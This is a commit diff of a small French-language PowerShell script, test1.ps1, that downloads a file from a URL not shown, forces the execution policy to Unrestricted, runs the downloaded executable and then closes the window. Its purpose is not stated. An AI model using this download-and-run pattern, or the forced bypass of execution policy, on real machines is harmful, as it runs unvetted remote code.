69956e3bbd53efccaefce21f3d5728b01cf80f2a
ExoTiiCk <128480835+ExoTiiCk@users.noreply.github.com>
2025-03-15 21:13:31 +0100

    Update test1.ps1

--- test1.ps1
+++ test1.ps1
@@ -12,20 +12,17 @@ function Show-FileLocation {
     param (
         [string]$filePath
     )
-    Write-Output ""
+    Write-Output "Le fichier a été téléchargé à l'emplacement suivant : $filePath"
 }
 
 # Afficher le chemin de téléchargement
-Write-Output ""
+Write-Output "Chemin de téléchargement : $localPath"
 
 # Créer le répertoire "Téléchargements" s'il n'existe pas
 if (-Not (Test-Path -Path "$userProfile\Downloads")) {
     New-Item -ItemType Directory -Path "$userProfile\Downloads"
-    Write-Output ""
+    Write-Output "Le répertoire 'Téléchargements' a été créé."
 }
-
-# Désactiver temporairement la politique d'exécution
-    Set-ExecutionPolicy Unrestricted -Force
 
 # Télécharger le fichier avec Invoke-WebRequest
 try {
@@ -33,22 +30,30 @@ try {
     Write-Output "Le fichier a été téléchargé avec succès."
     Show-FileLocation -filePath $localPath
 } catch {
-    Write-Output ""
+    Write-Output "Erreur lors du téléchargement du fichier : $_"
 }
 
 # Vérifier si le fichier a été téléchargé avec succès
 if (Test-Path $localPath) {
-    Write-Output ""
+    Write-Output "Le fichier existe à l'emplacement : $localPath"
+
+    # Désactiver temporairement la politique d'exécution
+    Set-ExecutionPolicy Unrestricted -Force
 
     # Lancer le fichier exécutable
     try {
         Start-Process -FilePath $localPath
-        Write-Output ""
+        Write-Output "Le fichier a été exécuté avec succès."
     } catch {
-        Write-Output ""
+        Write-Output "Erreur lors de l'exécution du fichier : $_"
     }
+
+    # Réactiver la politique d'exécution par défaut
+    Set-ExecutionPolicy Restricted -Force
 } else {
-    Write-Output ""
+    Write-Output "Le fichier n'a pas été téléchargé correctement."
 }
 
+# Fermer la fenêtre PowerShell immédiatement
+Write-Output "Fermeture de la fenêtre PowerShell..."
 exit
